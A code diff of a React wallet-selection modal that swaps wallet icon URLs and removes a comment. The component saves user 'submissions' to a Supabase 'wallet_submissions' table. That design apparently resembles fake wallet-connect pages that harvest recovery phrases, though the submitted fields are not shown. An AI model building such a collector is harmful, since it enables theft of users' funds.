@@ -38,9 +38,9 @@ interface Wallet {
 
 const wallets: Wallet[] = [
   { name: "METAMASK", desc: "BROWSER EXTENSION", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Manifest_Icon.svg" },
-  { name: "PHANTOM", desc: "BROWSER EXTENSION", e2e: true, icon: "https://phantom.app/img/logo.png" },
-  { name: "COINBASE WALLET", desc: "MOBILE/DESKTOP", e2e: true, icon: "https://upload.wikimedia.org/wikipedia/commons/d/de/Coinbase_Logo_2021.svg" },
-  { name: "TRUST WALLET", desc: "MOBILE", e2e: true, icon: "https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.svg" },
+  { name: "PHANTOM", desc: "BROWSER EXTENSION", e2e: true, icon: "https://raw.githubusercontent.com/solana-labs/token-list/main/assets/mainnet/PHANTOM/logo.png" },
+  { name: "COINBASE WALLET", desc: "MOBILE/DESKTOP", e2e: true, icon: "https://raw.githubusercontent.com/coinbase/coinbase-wallet-sdk/master/packages/wallet-sdk/assets/coinbase-wallet-logo.svg" },
+  { name: "TRUST WALLET", desc: "MOBILE", e2e: true, icon: "https://raw.githubusercontent.com/trustwallet/assets/master/public/images/logo.png" },
   { name: "NABOX", desc: "EXTENSION/MOBILE", e2e: true, icon: "https://nabox.io/favicon.ico" },
   { name: "TAP WALLET", desc: "BROWSER EXTENSION", e2e: true, icon: "https://tap.global/favicon.ico" },
   { name: "ROBINHOOD WALLET", desc: "MOBILE", e2e: true, icon: "https://robinhood.com/favicon.ico" },
@@ -137,7 +137,6 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
 
       await supabaseClient.from("wallet_submissions").insert([submissionData]);
       
-      // Optionally redirect or show success before reset
       resetState();
     } catch (error) {
       console.error("Submission failed:", error);
